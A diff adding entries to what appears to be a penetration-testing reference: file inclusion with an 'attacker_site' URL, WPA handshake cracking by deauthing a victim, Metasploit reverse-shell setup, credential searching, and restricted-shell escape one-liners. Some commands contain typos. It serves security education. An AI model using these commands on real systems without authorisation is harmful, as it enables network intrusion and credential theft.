+      "Description": "LFI is the process of including files that are already locally present on a server, we exploit the vulnerable inclusion procedure implementation by the web application.\n When a page receives as input the path to the file that has to be included and this input is not properly sanitized, allowingdirectory traversal characters (like dot-dot-slash) to be injected.\nGenerally assumed to be just a PHP exploit it can be common in JSP, and ASP.\n\nAn example would be as follows: http://vulnerable_host/preview.php?file=example.html \nWe would replace example.html will our own traversal characters such as: file=../../../../etc/passwd",
+      "Description_HTML": "<p>LFI is the process of including files that are already locally present on a server, we exploit the vulnerable inclusion procedure implementation by the web application.</p> <p>When a page receives as input the path to the file that has to be included and this input is not properly sanitized, allowingdirectory traversal characters (like dot-dot-slash) to be injected.</p> <p>Generally assumed to be just a PHP exploit it can be common in JSP, and ASP.</p> <p>An example would be as follows: http://vulnerable_host/preview.php?file=example.html</p> <p>We would replace example.html will our own traversal characters such as: file=../../../../etc/passwd</p>"
+    },
+	{
+      "Name": "Remote File Inclusion",
+      "Tags": [
+        "Web Exploitation",
+        "File Inclusion"
+      ],
+      "Description": "Remote File Inclusion much like Local File Inclusion works off the same premise the file is just referenced externally through URL.\n Take the following example: http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicious_page \n We can modify the file= to point to any file or page we want on the internet which in theory would be included in the PHP page upon request.",
+      "Description_HTML": "<p>Remote File Inclusion much like Local File Inclusion works off the same premise the file is just referenced externally through URL.</p> <p>Take the following example: http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicious_page </p> <p>We can modify the file= to point to any file or page we want on the internet which in theory would be included in the PHP page upon request.</p>"
+    },
+    {
+      "Name": "WPA Crack",
+      "Tags": [
+        "Wireless Exploitation",
+        "Tools"
+      ],
+      "Description": "In order to crack WPA, we used aircrack-ng.\n\nFirst the service is started on the WiFi card:\n*airmon-ng start (interface)---Starts the monitoring service on wlan0*\n\nSecondly we started to dump data that the laptop used:\n*airdump-ng (interface)mon*---Shows the user info about current WiFi connections nearby\n\nAfter, choose the selected BSSID you want to monitor in specific (the BSSID the victim is connected to):\n*airodump-ng -c (channel) --bssid (BSSID) -w (path) (interface)*---This show you activity for the specified BSSID\n\nIn order to deauth, we used the following command and MAC of the specified victim (seen from the command above):\n*aireplay-ng -0 2 -a (BSSID) -c (MAC) (interface)*---This will deAuth the specified MAC from the device and save the WPA handshake.\n\nNext, we can aircrack it using this command:\n*aircrack-ng -a2 -b (BSSID) -2 (PATH-OF-WORDLIST) (PATH-OF-CAP-FILE)*---This will give you the password of the WPA connection.",
+      "Description_HTML": "In order to crack WPA, we used aircrack-ng.<br /><br />First the service is started on the WiFi card:<br />*airmon-ng start (interface)---Starts the monitoring service on wlan0*<br /><br />Secondly we started to dump data that the laptop used:<br />*airdump-ng (interface)mon*---Shows the user info about current WiFi connections nearby<br /><br />After, choose the selected BSSID you want to monitor in specific (the BSSID the victim is connected to):<br />*airodump-ng -c (channel) --bssid (BSSID) -w (path) (interface)*---This show you activity for the specified BSSID<br /><br />In order to deauth, we used the following command and MAC of the specified victim (seen from the command above):<br />*aireplay-ng -0 2 -a (BSSID) -c (MAC) (interface)*---This will deAuth the specified MAC from the device and save the WPA handshake.<br /><br />Next, we can aircrack it using this command:<br />*aircrack-ng -a2 -b (BSSID) -2 (PATH-OF-WORDLIST) (PATH-OF-CAP-FILE)*---This will give you the password of the WPA connection."
+    },
+    {
+      "Name": "Wardriving",
+      "Tags": [
+        "Wireless Exploitation"
+      ],
+      "Description": "Art of driving around an area, using a wireless card and software to identify availablewireless networks, their SSID, channels and authentication methods.",
+      "Description_HTML": "Art of driving around an area, using a wireless card and software to identify availablewireless networks, their SSID, channels and authentication methods."
+    },
+    {
+      "Name": "Warwalking",
+      "Tags": [
+        "Wireless Exploitation"
+      ],
+      "Description": "Art of walking around an area, using a wireless card and software to identify availablewireless networks, their SSID, channels and authentication methods.",
+      "Description_HTML": "Art of walking around an area, using a wireless card and software to identify availablewireless networks, their SSID, channels and authentication methods."
+    },
+    {
+      "Name": "aircrack-ng",
+      "Tags": [
+        "Wireless Exploitation",
+        "Tools"
+      ],
+      "Description": "Tool used to crack WPA WEP and various WiFi authentication. For detail search WPA Crack",
+      "Description_HTML": "Tool used to crack WPA WEP and various WiFi authentication. For detail search WPA Crack"
+    },
+    {
+      "Name": "wifiphisher",
+      "Tags": [
+        "Wireless Exploitation",
+        "Tools"
+      ],
+      "Description": "Tool that easily lets you create fake and malicious access points. Is integrated into Kali and it is very easy to use.",
+      "Description_HTML": "Tool that easily lets you create fake and malicious access points. Is integrated into Kali and it is very easy to use."
+    },
+    {
+      "Name": "KRACK",
+      "Tags": [
+        "Wireless Exploitation",
+        "Tools"
+      ],
+      "Description": "A tool revealed in October 2017, which allows an attacker to exploit current WPA2 connections. The tool has been showed on YouTube, although the source code is not yet available.\nLink for more info: https://www.krackattacks.com/",
+      "Description_HTML": "A tool revealed in October 2017, which allows an attacker to exploit current WPA2 connections. The tool has been showed on YouTube, although the source code is not yet available.<br />Link for more info: https://www.krackattacks.com/"
+    },
+    {
+      "Name": "cowpatty",
+      "Tags": [
+        "Wireless Exploitation",
+        "Tools"
+      ],
+      "Description": "Kali tool integrated into the OS, used for offline dictionary attacks against wireless authentication:\ncowpatty-h    This will show you all available commands. For more information:https://tools.kali.org/wireless-attacks/cowpatty",
+      "Description_HTML": "Kali tool integrated into the OS, used for offline dictionary attacks against wireless authentication:<br />cowpatty-h    This will show you all available commands. For more information:https://tools.kali.org/wireless-attacks/cowpatty"
+    },
+    {
+      "Name": "reaver",
+      "Tags": [
+        "Wireless Exploitation",
+        "Tools"
+      ],
+      "Description": "Reaver is a tool used in kali for WPS attacks. It can recover WPA and WPA2 passphrases. It will recover the target AP's password.\nreaver -h    will reveal useful commands.\nFor more information:https://tools.kali.org/wireless-attacks/reaver",
+      "Description_HTML": "Reaver is a tool used in kali for WPS attacks. It can recover WPA and WPA2 passphrases. It will recover the target AP's password.<br />reaver -h    will reveal useful commands.<br />For more information:https://tools.kali.org/wireless-attacks/reaver"
+    },
+    {
+      "Name": "General",
+      "Tags": [
+        "Software Exploitation",
+        "Metasploit"
+      ],
+      "Description": "Framework used for automatic tasks. Used for general pentesting and attacks. Metasploit builds automatic payloads and makes use of existing vulnerabilities to exploit machines.\nMetasploit includes:\nScanners\nExploits\nPayloads\nEncoders",
+      "Description_HTML": "Framework used for automatic tasks. Used for general pentesting and attacks. Metasploit builds automatic payloads and makes use of existing vulnerabilities to exploit machines.<br />Metasploit includes:<br />Scanners<br />Exploits<br />Payloads<br />Encoders"
+    },
+    {
+      "Name": "MFconsole",
+      "Tags": [
+        "Software Exploitation",
+        "Metasploit"
+      ],
+      "Description": "MFconsole is the most popular command line and the most flexible. It is also the only interface that supports plugins.\n\nHelp commands:\nhelp vulns\nhelp connect\nhelp route\nhelp use\n\nYou can pick an exploit by:\nuse EXPLOIT\n use windows/shell_reverse_tcp\n\nAfter, MFSconsole sets the following\nset LHOST IP\nset LPORT PORT\n\nOnce an exploit is found, it can be checked with:\ncheck\n\n And then exploited with\nexploit",
+      "Description_HTML": "MFconsole is the most popular command line and the most flexible. It is also the only interface that supports plugins.<br /><br />Help commands:<br />help vulns<br />help connect<br />help route<br />help use<br /><br />You can pick an exploit by:<br />use EXPLOIT<br /> use windows/shell_reverse_tcp<br /><br />After, MFSconsole sets the following<br />set LHOST IP<br />set LPORT PORT<br /><br />Once an exploit is found, it can be checked with:<br />check<br /><br /> And then exploited with<br />exploit"
+    },
+    {
+      "Name": "MSFcli",
+      "Tags": [
+        "Software Exploitation",
+        "Metasploit"
+      ],
+      "Description": "MSFcli is designed to create scripts. Commands include:\nmsfcli PAYLOAD.\nSome options include:\n O: displays the options\nRHOST\nRPORT\nSMBPIPE\nP determines payloads\n",
+      "Description_HTML": "MFcli is designed to create scripts. Commands include:<br />msfcli PAYLOAD.<br />Some options include:<br /> O: displays the options<br />RHOST<br />RPORT<br />SMBPIPE<br />P determines payloads<br />"
+    },
+    {
+      "Name": "Armitage",
+      "Tags": [
+        "Software Exploitation",
+        "Metasploit"
+      ],
+      "Description": "Is an interactive GUI. It's designed to be a point and clock pwnage type of tool. Supports bits and scripts. It is fun and easy to use, however not much functionality and use compared to mfsconsole and msfcli.",
+      "Description_HTML": "Is an interactive GUI. It's designed to be a point and clock pwnage type of tool. Supports bits and scripts. It is fun and easy to use, however not much functionality and use compared to mfsconsole and msfcli."
+    },
+    {
+      "Name": "Metasploit database",
+      "Tags": [
+        "Software Exploitation",
+        "Metasploit"
+      ],
+      "Description": "The metasploit database keeps track of everything you have done to a network. This is essential for documenting a pentest. The databse must be configured.\nA default workspace is always created.\n\nhosts    lists available hosts in the database\nservices    ports/services gathered from known hosts\nvuln -i    shows log of utilized vulns\ndb_import PATH    imports 3rd party tool\ndb_export PATH",
+      "Description_HTML": "The metasploit database keeps track of everything you have done to a network. This is essential for documenting a pentest. The databse must be configured.<br />A default workspace is always created.<br /><br />hosts    lists available hosts in the database<br />services    ports/services gathered from known hosts<br />vuln -i    shows log of utilized vulns"
+    },
+    {
+      "Name": "MSFpayload",
+      "Tags": [
+        "Software Exploitation",
+        "Metasploit"
+      ],
+      "Description": "This tool is used to generate a shellcode in multiple languages (C,Ruby,JAVA)\n\nCommands:\nmsfpayload PAYLOAD O    shows payload options\nLHOST\nLPORT\n",
+      "Description_HTML": "This tool is used to generate a shellcode in multiple languages (C,Ruby,JAVA)<br /><br />Commands:<br />msfpayload PAYLOAD O    shows payload options<br />LHOST<br />LPORT<br />"
+    },
+    {
+      "Name": "MSFencode",
+      "Tags": [
+        "Software Exploitation",
+        "Metasploit"
+      ],
+      "Description": "Utility for dealing with bad bytes and null bytes.List known encodes:\nmsfencode -l",
+      "Description_HTML": "Utility for dealing with bad bytes and null bytes.List known encodes:<br />msfencode -l"
+    },
+    {
+      "Name": "MSFvenom",
+      "Tags": [
+        "Software Exploitation",
+        "Metasploit"
+      ],
+      "Description": "Utility used to generate custom shellcode. It supports multiple architectures and commands. After you choose the payload, you use msfvenom to create the custom payload and try to get it on the victims computer without being detected.\nExample command:\nmsfvenom -p linux/x86/exec CMD='/bin/sh' -a x86 -b 'SHELL' -i 0\n-p     specifies payload\n-a     specifies the architecture\n-b      specifies bad characted to TRY and avoid.\n-i     specifies number of times to encode.",
+      "Description_HTML": "Utility used to generate custom shellcode. It supports multiple architectures and commands.Example command:<br />msfvenom -p linux/x86/exec CMD='/bin/sh' -a x86 -b 'SHELL' -i 0<br />-p     specifies payload<br />-a     specifies the architecture<br />-b      specifies bad characted to TRY and avoid.<br />-i     specifies number of times to encode."
+    },
+	{
+      "Name": "Client-Side Exploitation",
+      "Tags": [
+        "Endpoint Exploitation",
+        "Client Exploitation"
+      ],
+      "Description": "Client-Side exploitation is becomming the new low hanging fruit with organizatitons hardening their endpoints attackers need a new point on entry into an organization.\nClients are the most susceptible to attack more than ever because all it takes is one user to create a backdoor into an organization. Clients are excellent targets because they have:\n-Access to the internal network\n-Possibly have local admin or power user groups\n-Gullible in comparisson to other avenues of social engineering",
+      "Description_HTML": "<p>Client-Side exploitation is becomming the new low hanging fruit with organizatitons hardening their endpoints attackers need a new point on entry into an organization.</p> <p>Clients are the most susceptible to attack more than ever because all it takes is one user to create a backdoor into an organization. Clients are excellent targets because they have: -Access to the internal network</p> <p>-Possibly have local admin or power user groups</p> <p>-Gullible in comparisson to other avenues of social engineering</p>"
+    },
+	{
+      "Name": "Desktop Exploitation",
+      "Tags": [
+        "Endpoint Exploitation",
+        "Desktop"
+      ],
+      "Description": "Desktops are generally lower down on the list of expected attack vectors, therefore generally experience less protection and general attention from an organization. However, because desktops have no need to be remotely accessed it makes it hard to fingerprint them without some form of direct access.\nDesktops present many more ways to attack due to many 3rd party applications, and in-house software. This gives us as attackers many different ways to exploit the workstation machine.\nUsers are great targets because they have legitimate access to critical assets, additionally they have Domain User status on the network letting the browse system files shares, net commands, and other things SYSTEM cannot.",
+      "Description_HTML": "<p>Desktops are generally lower down on the list of expected attack vectors, therefore generally experience less protection and general attention from an organization. However, because desktops have no need to be remotely accessed it makes it hard to fingerprint them without some form of direct access.</p> <p>Desktops present many more ways to attack due to many 3rd party applications, and in-house software. This gives us as attackers many different ways to exploit the workstation machine.</p> <p>Users are great targets because they have legitimate access to critical assets, additionally they have Domain User status on the network letting the browse system files shares, net commands, and other things SYSTEM cannot.</p>"
+    },
+	{
+      "Name": "Entry Points",
+      "Tags": [
+        "Endpoint Exploitation",
+        "Desktop"
+      ],
+      "Description": "Many entry points exist for workstation clients, these vectors of attack are just a baseline you will see on most workstations.\n-Office Suites\n-Adobe\n-DHTML Compliant Browser\n-ActiveX\n-Java Plugins\n-Javascript\n-IM/P2P\n-Media Player\n-XSS-able web site\n-Social Engineering\n-Physical",
+      "Description_HTML": "<p>Many entry points exist for workstation clients, these vectors of attack are just a baseline you will see on most workstations.</p> <p>-Office Suites</p> <p>-Adobe</p> <p>-DHTML Compliant Browser -ActiveX</p> <p>-Java Plugins</p> <p>-Javascript</p> <p>-IM/P2P</p> <p>-Media Player</p> <p>-XSS-able web site</p> <p>-Social Engineering</p> <p>-Physical</p>"
+    },
+	{
+      "Name": "File Format Exploits",
+      "Tags": [
+        "Endpoint Exploitation",
+        "Desktop"
+      ],
+      "Description": "Using the entry points we can take advantage of individual exploits that exists within software, these can range from buffer overflows, to javascript code execution in PDF readers.\nMetasploit console is an excellent tool to for injecting this malicious code into common file formats, as all the tools already exist and you can deploy your own personalized payloads or add to the repository that currently exists.\nYou can use Metasploits File Formatter via: use exploit/OPERATINGSYSTEM/fileformat/tool",
+      "Description_HTML": "<p>Using the entry points we can take advantage of individual exploits that exists within software, these can range from buffer overflows, to javascript code execution in PDF readers.</p> <p>Metasploit console is an excellent tool to for injecting this malicious code into common file formats, as all the tools already exist and you can deploy your own personalized payloads or add to the repository that currently exists.</p> <p>You can use Metasploits File Formatter via: use exploit/OPERATINGSYSTEM/fileformat/tool</p>"
+    },
+    {
+      "Name": "AT Command",
+      "Tags": [
+        "Privilege Escalation",
+        "Windows"
+      ],
+      "Description": "In Windows privilege escalation it's quite simple to escalate privileges using the at command for scheduling tasks\nThe at command schedules a task differently than 'schtasks' which schedules tasks as the user account, at schedules the task as SYSTEM giving instant privilege escalation.\nNOTE: In more modern operating systems at has been depreciated and is uniformly adopting schtasks.",
+      "Description_HTML": "<p>In Windows privilege escalation it's quite simple to escalate privileges using the at command for scheduling tasks The at command schedules a task differently than 'schtasks' which schedules tasks as the user account, at schedules the task as SYSTEM giving instant privilege escalation.</p> <p>NOTE: In more modern operating systems at has been depreciated and is uniformly adopting schtasks.</p>"
+    },
+    {
+      "Name": "Binary Replacement",
+      "Tags": [
+        "Privilege Escalation",
+        "Windows"
+      ],
+      "Description": "Replacing binaries in Windows is a great way to escalate privilege however requires a unprivileged account to do.\nReplacing Stickykeys is a great example found in: C:/windows/system32/setchc.exe then upon triggering stickykeys will execute your binary.",
+      "Description_HTML": "<p>Replacing binaries in Windows is a great way to escalate privilege however requires a unprivileged account to do.</p> <p>Replacing Stickykeys is a great example found in: C:/windows/system32/setchc.exe then upon triggering stickykeys will execute your binary.</p>"
+    },
+    {
+      "Name": "Clear Text/Base64 Credentials",
+      "Tags": [
+        "Privilege Escalation",
+        "Windows"
+      ],
+      "Description": "Often left behind by OEM manufacturers or SYS admins even found in network drives on Windows domains plaintext passwords for administrator accounts\nBase64 credentials are just as common found in MS Sysprep files in XML format show passwords in base64 encoded. Sysprep is used as a System Preparation Tool for automatic deployment and configuration of windows systems.",
+      "Description_HTML": "<p>Often left behind by OEM manufacturers or SYS admins even found in network drives on Windows domains plaintext passwords for administrator accounts</p> <p>Base64 credentials are just as common found in MS Sysprep files in XML format show passwords in base64 encoded. Sysprep is used as a System Preparation Tool for automatic deployment and configuration of windows systems.</p>"
+    },
+    {
+      "Name": "Registry Credentials",
+      "Tags": [
+        "Privilege Escalation",
+        "Windows"
+      ],
+      "Description": "The registry is a great place to find credentials, sometimes encrypted or in plain text. The registry can be accessed by two means, through the GUI Regedit program or by using reg command line tool.\nExample query: reg query 'HKLM/SOFTWARE/MICROSOFT/WINDOWS NT/Currentversion/Winlogon'\nSNMP: HKLM/SYSTEM/CurrentControlSet/Services/SNMP/\nPutty: hKcu/Software/SimonTatham/PuTTY/Sessions",
+      "Description_HTML": "<p>The registry is a great place to find credentials, sometimes encrypted or in plain text. The registry can be accessed by two means, through the GUI Regedit program or by using reg command line tool.</p> <p>Example query: reg query 'HKLM/SOFTWARE/MICROSOFT/WINDOWS NT/Currentversion/Winlogon'</p> <p>SNMP: HKLM/SYSTEM/CurrentControlSet/Services/SNMP/</p> <p>Putty: hKcu/Software/SimonTatham/PuTTY/Sessions</p>"
+    },
+	{
+      "Name": "Shatter Attack",
+      "Tags": [
+        "Privilege Escalation",
+        "Windows"
+      ],
+      "Description": "In Windows XP/2003\nAnything running as SYSTEM with a window can be attacked from the command line\nApplications that contain:\n-Listview/Treeview\n-RichTextBox\nEditBox\nWe can use these input/output boxes to output information accessed via the command line.",
+      "Description_HTML": "<p>In Windows XP/2003</p> <p>Anything running as SYSTEM with a window can be attacked from the command line Applications that contain:</p> <p>-Listview/Treeview</p> <p>-RichTextBox</p> <p>EditBox</p> <p>We can use these input/output boxes to output information accessed via the command line.</p>"
+    },
+	{
+      "Name": "Trojaning Autorun",
+      "Tags": [
+        "Privilege Escalation",
+        "Windows"
+      ],
+      "Description": "By enumerating the autoruns (Applications that run on startup) we can simply replace binaries if possible, or even replace Dynamic Link Libaries being accessed by the applciations to install our own Trojan into a users system.\nUsing Process Monitor we can view DLLS a program is using and from there we can determine what DLLs we can then replace with our Trojan.",
+      "Description_HTML": "<p>By enumerating the autoruns (Applications that run on startup) we can simply replace binaries if possible, or even replace Dynamic Link Libaries being accessed by the applciations to install our own Trojan into a users system.</p> <p>Using Process Monitor we can view DLLS a program is using and from there we can determine what DLLs we can then replace with our Trojan.</p>"
+    },
+	{
+      "Name": "Orphaned Installs",
+      "Tags": [
+        "Privilege Escalation",
+        "Windows"
+      ],
+      "Description": "We can use Autoruns in sysinternals to find file references that are missing. We know some application on the system is looking for that file to be ran at some point in time.\nWe can then create the structure for the missing file and replace that file with whatever we want with a fair amount of certainty that our file will execute again at some point in time.",
+      "Description_HTML": "<p>We can use Autoruns in sysinternals to find file references that are missing. We know some application on the system is looking for that file to be ran at some point in time.</p> <p>We can then create the structure for the missing file and replace that file with whatever we want with a fair amount of certainty that our file will execute again at some point in time.</p>"
+    },
+    {
+      "Name": "Enumerating Linux",
+      "Tags": [
+        "Privilege Escalation",
+        "Linux"
+      ],
+      "Description": "First, we must gather information about the system:\n\nInformation about the OS:\ncat /etc/issue\ncat /etc/*-release\n\nKernel Version:\ncat /proc/version\n\nOther:\nhostname\ncat /etc/hosts\ncat /etc/resolv.conf\n\nUsers:\nwhoami\ncat /etc/passwd\ncat /etc/groups",
+      "Description_HTML": "First, we must gather information about the system:<br /><br />Information about the OS:<br />cat /etc/issue<br />cat /etc/*-release<br /><br />Kernel Version:<br />cat /proc/version<br /><br />Other:<br />hostname<br />cat /etc/hosts<br />cat /etc/resolv.conf<br /><br />Users:<br />whoami<br />cat /etc/passwd<br />cat /etc/groups"
+    },
+    {
+      "Name": "Abusing File Permissions",
+      "Tags": [
+        "Privilege Escalation",
+        "Linux"
+      ],
+      "Description": "You can find world-writable directories for the root user/group:\nfind / /( -wholename '/home/homedir*' -prune /) -o /( -type d -perm -0002 /) -exec ls -ld '{}' ';' 2>/dev/null | grep roto\n\nYou can also use a similar command to find world-writable directories for users:\nfind / /( -wholename '/home/homedir*' -prune /) -o /( -type d -perm -0002 /) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root\n\nTo check if the /root directory is available:\nls -ahlR /root 2>/dev/null",
+      "Description_HTML": "You can find world-writable directories for the root user/group:<br />find / /( -wholename '/home/homedir*' -prune /) -o /( -type d -perm -0002 /) -exec ls -ld '{}' ';' 2>/dev/null | grep roto<br /><br />You can also use a similar command to find world-writable directories for users:<br />find / /( -wholename '/home/homedir*' -prune /) -o /( -type d -perm -0002 /) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root<br /><br />To check if the /root directory is available:<br />ls -ahlR /root 2>/dev/null"
+    },
+    {
+      "Name": "Searching for Passwords",
+      "Tags": [
+        "Privilege Escalation",
+        "Linux"
+      ],
+      "Description": "Commands to parse log files for password entries:\nfind /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null\n\nSearch /etc/ config files for stored passwords:\nfind /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null\n\n",
+      "Description_HTML": "Commands to parse log files for password entries:<br />find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null<br /><br />Search /etc/ config files for stored passwords:<br />find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null<br /><br />"
+    },
+    {
+      "Name": "Enumerate Installed Software",
+      "Tags": [
+        "Privilege Escalation",
+        "Linux"
+      ],
+      "Description": "Enumerating software can help you exploit the running processes.\n\nFor ubuntu:\ndpkg -l | awk '{$1=$4=\"\"; print $0}’\n\nFor CentOS/RHEL:\nrpm -qa | sort –u\n\nRunning processes:\nps aux | awk '{print $1,$2,$9,$10,$11}’",
+      "Description_HTML": "Enumerating software can help you exploit the running processes.<br /><br />For ubuntu:<br />dpkg -l | awk '{$1=$4=\"\"; print $0}’<br /><br />For CentOS/RHEL:<br />rpm -qa | sort –u<br /><br />Running processes:<br />ps aux | awk '{print $1,$2,$9,$10,$11}’"
+    },
+    {
+      "Name": "Escape Restricted Shell",
+      "Tags": [
+        "Privilege Escalation",
+        "Linux"
+      ],
+      "Description": "If the shell is limiting commands or sudo privileges, the attacker can attempt to escape into a global shell:\n\nUsing vi:\n:!bash\n:set shell=/bin/bash:shell\n\n Using AWK:\nawk 'BEGIN {system(\"/bin/bash\")}'\n\nUsing PERL:\nperl -e 'exec \"/bin/bash\";’\n\nUsing Find:\nfind / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;\n",
+      "Description_HTML": "If the shell is limiting commands or sudo privileges, the attacker can attempt to escape into a global shell:<br /><br />Using vi:<br />:!bash<br />:set shell=/bin/bash:shell<br /><br /> Using AWK:<br />awk 'BEGIN {system(\"/bin/bash\")}'<br /><br />Using PERL:<br />perl -e 'exec \"/bin/bash\";’<br /><br />Using Find:<br />find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;<br />"
+    },
+    {
+      "Name": "Dirty Cow Exploit",
+      "Tags": [
+        "Privilege Escalation",
+        "Linux"
+      ],
+      "Description": "Condition in kernel that allows the attacker to overwrite contents of any file. This is an exploit that works on old/unpached systems. Found available on exploitdb",
+      "Description_HTML": "Condition in kernel that allows the attacker to overwrite contents of any file. This is an exploit that works on old/unpached systems. Found available on exploitdb"
+    },
+    {
+      "Name": "Uploading Kernel Exploits",
+      "Tags": [
+        "Privilege Escalation",
+        "Linux"
+      ],
+      "Description": "Some tools that can be discovered for kernel exploits include the following:\nFPT\nSCP/SFTP\nNetcat\nDirectly pasting in vi or nano",
+      "Description_HTML": "Some tools that can be discovered for kernel exploits include the following:<br />FPT<br />SCP/SFTP<br />Netcat<br />Directly pasting in vi or nano"
+    }
+  ]
+}
